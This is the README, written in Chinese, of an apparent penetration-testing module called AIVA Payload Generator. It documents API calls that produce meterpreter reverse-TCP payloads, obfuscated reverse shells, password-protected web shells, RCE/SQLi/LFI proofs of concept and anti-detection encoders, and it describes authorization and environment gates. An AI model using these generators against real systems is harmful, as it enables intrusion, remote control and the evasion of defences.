# AIVA Payload Generator 模組

**導航**: [← 返回 Features](../README.md) | [📖 增強計畫](../../../../../Users/User/Downloads/新增資料夾%20(6)/AIVA_Enhancement_Plan/05_B_Payload_Generator_Technical_Integration.md)

> **🎯 風險等級**: L2-L3 (High-Critical Risk)  
> **✅ 授權要求**: RiskGuard L2+ 或 Authorization Token  
> **🔄 最後更新**: 2025年11月25日

## 📋 目錄

- [概述](#概述)
- [核心能力](#核心能力)
- [目錄結構](#目錄結構)
- [快速開始](#快速開始)
- [API 文檔](#api-文檔)
- [安全機制](#安全機制)
- [開發指南](#開發指南)

## 概述

Payload Generator 模組提供完整的攻擊 Payload 生成能力,支援:

- **MSFVenom 封裝**: 所有平台和格式
- **Reverse Shell**: 8 種程式語言
- **Web Shell**: PHP/ASPX/JSP
- **PoC 生成**: RCE/SQLi/LFI 自動化
- **混淆與編碼**: 多種反偵測技術

## 核心能力

### 1. MSFVenom Wrapper

```python
from services.features.function_payload_generator import PayloadGeneratorManager

manager = PayloadGeneratorManager()

# 生成 Windows Reverse Shell
payload = await manager.generate_msfvenom_payload(
    payload_type="windows/meterpreter/reverse_tcp",
    lhost="192.168.1.100",
    lport=4444,
    format="exe"
)
```

**支援平台**:
- Windows (exe, dll, msi)
- Linux (elf)
- macOS (macho)
- Android (apk)
- PHP (php)
- Python (py)
- Bash (sh)

### 2. Reverse Shell Generator

```python
# 生成 Python Reverse Shell
reverse_shell = await manager.generate_reverse_shell(
    language="python",
    lhost="192.168.1.100",
    lport=4444,
    obfuscate=True  # 自動混淆
)
```

**支援語言**:
- Bash
- Python
- PowerShell
- PHP
- Ruby
- Perl
- Java
- C

### 3. Web Shell Generator

```python
# 生成 PHP Web Shell (高級版)
webshell = await manager.generate_webshell(
    type="php_advanced",
    password="strong_password",
    obfuscate=True
)
```

**支援類型**:
- PHP Simple WebShell
- PHP Advanced WebShell
- ASPX WebShell
- JSP WebShell

### 4. PoC Generator

```python
# 生成 RCE PoC
poc = await manager.generate_poc(
    vulnerability_type="rce",
    target_url="https://target.com/vuln",
    cve_id="CVE-2024-1234",
    parameters={
        "command": "whoami",
        "injection_point": "cmd"
    }
)
```

## 目錄結構

```
function_payload_generator/
├── __init__.py                    # 模組初始化
├── README.md                      # 本文件
├── manager.py                     # 主管理器
├── models.py                      # 數據模型
├── schemas.py                     # Pydantic Schema
├── engines/                       # 生成引擎
│   ├── __init__.py
│   ├── msfvenom_wrapper.py        # MSFVenom 封裝
│   ├── reverse_shell_generator.py # Reverse Shell 生成
│   └── webshell_generator.py      # Web Shell 生成
├── generators/                    # PoC 生成器
│   ├── __init__.py
│   ├── poc_generator.py           # PoC 生成邏輯
│   ├── rce_generator.py           # RCE PoC
│   ├── sqli_generator.py          # SQLi PoC
│   └── lfi_generator.py           # LFI PoC
├── delivery/                      # 交付機制
│   ├── __init__.py
│   ├── http_server.py             # HTTP 服務器
│   ├── ftp_server.py              # FTP 服務器
│   └── listener_manager.py        # 監聽器管理
├── obfuscation/                   # 混淆模組
│   ├── __init__.py
│   ├── base64_encoder.py
│   ├── hex_encoder.py
│   └── polymorphic_engine.py
├── templates/                     # Payload 模板
│   ├── reverse_shells/
│   ├── webshells/
│   └── pocs/
├── legacy/                        # 原始 hackingtool 代碼
│   └── payload_creator_original.py
└── tests/                         # 測試套件
    ├── test_msfvenom.py
    ├── test_reverse_shell.py
    ├── test_webshell.py
    └── test_poc_generator.py
```

## 快速開始

### 安裝依賴

```bash
cd services/features/function_payload_generator
pip install -r requirements.txt
```

### 基本使用

```python
from services.features.function_payload_generator import PayloadGeneratorManager
from services.aiva_common.enums import Severity

# 初始化管理器
manager = PayloadGeneratorManager(
    authorization_token="your_token_here"  # L2+ 授權
)

# 生成 Payload
result = await manager.generate_payload(
    type="reverse_shell",
    language="python",
    lhost="192.168.1.100",
    lport=4444
)

print(f"Payload: {result.payload}")
print(f"Delivery URL: {result.delivery_url}")
```

## 安全機制

### 1. RiskGuard 授權控制

```python
from services.core.aiva_core.service_backbone.authz.permission_matrix import authorize_operation

# 檢查授權
if not authorize_operation(
    operation_name="payload_generation",
    risk_level="L2",
    tags=["payload", "exploitation"],
    environment=os.getenv("AIVA_ENVIRONMENT", "development")
):
    raise PermissionError("Requires L2+ authorization")
```

### 2. Authorization Token 模式

```python
# 無 Token: 僅檢測模式
if not authorization_token:
    return {"mode": "detection_only", "payload": None}

# 有 Token: 完整功能
else:
    return {"mode": "full", "payload": generated_payload}
```

### 3. 環境隔離

```python
# 僅允許在開發/受控環境
allowed_envs = ["development", "controlled_pentest"]
if os.getenv("AIVA_ENVIRONMENT") not in allowed_envs:
    raise EnvironmentError("Payload generation not allowed in production")
```

## API 文檔

### PayloadGeneratorManager

#### `generate_msfvenom_payload()`

生成 MSFVenom Payload

**參數**:
- `payload_type` (str): Payload 類型 (e.g., "windows/meterpreter/reverse_tcp")
- `lhost` (str): 監聽主機 IP
- `lport` (int): 監聽端口
- `format` (str): 輸出格式 (exe, elf, dll 等)
- `encoder` (Optional[str]): 編碼器 (e.g., "x86/shikata_ga_nai")
- `iterations` (int): 編碼迭代次數 (預設: 3)

**返回**: `PayloadResult`

#### `generate_reverse_shell()`

生成 Reverse Shell

**參數**:
- `language` (str): 程式語言 (bash, python, powershell 等)
- `lhost` (str): 監聽主機 IP
- `lport` (int): 監聽端口
- `obfuscate` (bool): 是否混淆 (預設: False)

**返回**: `PayloadResult`

#### `generate_webshell()`

生成 Web Shell

**參數**:
- `type` (str): Web Shell 類型 (php_simple, php_advanced, aspx, jsp)
- `password` (str): 訪問密碼
- `obfuscate` (bool): 是否混淆 (預設: False)

**返回**: `PayloadResult`

#### `generate_poc()`

生成 PoC

**參數**:
- `vulnerability_type` (str): 漏洞類型 (rce, sqli, lfi)
- `target_url` (str): 目標 URL
- `cve_id` (Optional[str]): CVE ID
- `parameters` (dict): 額外參數

**返回**: `PayloadResult`

## 開發指南

### 添加新的 Payload 類型

1. 在 `models.py` 添加新枚舉值:
```python
class PayloadType(str, Enum):
    NEW_TYPE = "new_type"
```

2. 在 `engines/` 創建生成器:
```python
# engines/new_generator.py
class NewPayloadGenerator:
    def generate(self, config: PayloadConfig) -> str:
        # 實現生成邏輯
        pass
```

3. 註冊到 Manager:
```python
# manager.py
self.generators["new_type"] = NewPayloadGenerator()
```

### 添加新的混淆方法

```python
# obfuscation/custom_encoder.py
class CustomEncoder:
    def encode(self, payload: str) -> str:
        # 實現編碼邏輯
        return encoded_payload
```

### 測試

```bash
# 運行單元測試
pytest tests/ -v

# 運行特定測試
pytest tests/test_msfvenom.py -v

# 測試覆蓋率
pytest --cov=. --cov-report=html
```

## 相關文檔

- [完整技術規格](../../../../../Users/User/Downloads/新增資料夾%20(6)/AIVA_Enhancement_Plan/05_B_Payload_Generator_Technical_Integration.md)
- [AIVA Common README](../../aiva_common/README.md)
- [Authorization 機制](../../core/aiva_core/service_backbone/authz/README.md)
- [功能模組標準](../DEVELOPMENT_STANDARDS.md)

## 授權

本模組受 AIVA 系統授權保護,使用前需:
1. ✅ 通過 RiskGuard L2+ 授權檢查
2. ✅ 提供有效的 Authorization Token
3. ✅ 運行在允許的環境中 (development/controlled_pentest)

**警告**: 未經授權的 Payload 生成將被記錄並觸發安全警報。
